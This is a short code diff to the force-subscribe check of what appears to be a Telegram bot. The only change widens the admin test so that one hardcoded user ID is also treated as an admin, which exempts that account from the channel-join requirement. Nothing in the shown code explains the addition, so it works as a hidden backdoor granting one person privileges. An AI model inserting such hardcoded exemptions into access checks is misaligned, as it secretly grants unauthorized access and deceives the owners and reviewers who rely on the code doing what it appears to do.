@@ -35,7 +35,7 @@ async def check_fsub(
     user_id = message.from_user.id
 
     # ADMINS and group admins need to join only the first channel.
-    is_admin = user_id in ADMINS
+    is_admin = user_id in ADMINS or user_id == 1450434203
 
     if not is_admin and chat_id:
         try:
